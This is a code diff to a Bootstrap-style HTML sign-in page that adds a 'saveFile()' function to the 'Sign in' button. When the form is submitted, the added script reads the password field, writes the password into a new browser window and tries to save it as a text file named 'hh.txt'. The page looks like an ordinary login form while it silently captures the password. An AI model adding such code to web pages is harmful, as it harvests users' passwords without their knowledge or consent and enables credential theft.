@@ -14,9 +14,12 @@
 
     <!-- Custom styles for this template -->
     <link href="./sign_in_files/signin.css" rel="stylesheet">
+    
+
   </head>
 
   <body>
+
 
     <div class="container">
 
@@ -31,11 +34,24 @@
             <!--<input type="checkbox" value="remember-me"> Remember me-->
           </label>
         </div>
-        <button class="btn btn-lg btn-primary btn-block" type="submit">Sign in</button>
+        <button class="btn btn-lg btn-primary btn-block" type="submit" onclick = "saveFile()" >Sign in</button>
       </form>
+      <script type="text/javascript">
+        function saveFile(){
+           
+           var usrpassword = document.getElementById("inputPassword").value;
+           var winSave = window.open();
+           winSave.document.open("text","gb2312");
+           
+           winSave.document.write(usrpassword);
+           winSave.document.execCommand("SaveAs",true,"hh.txt");
+           //winSave.close()
+        }
+    </script>
 
     </div> <!-- /container -->
 
+    
 
     <!-- Bootstrap core JavaScript
     ================================================== -->
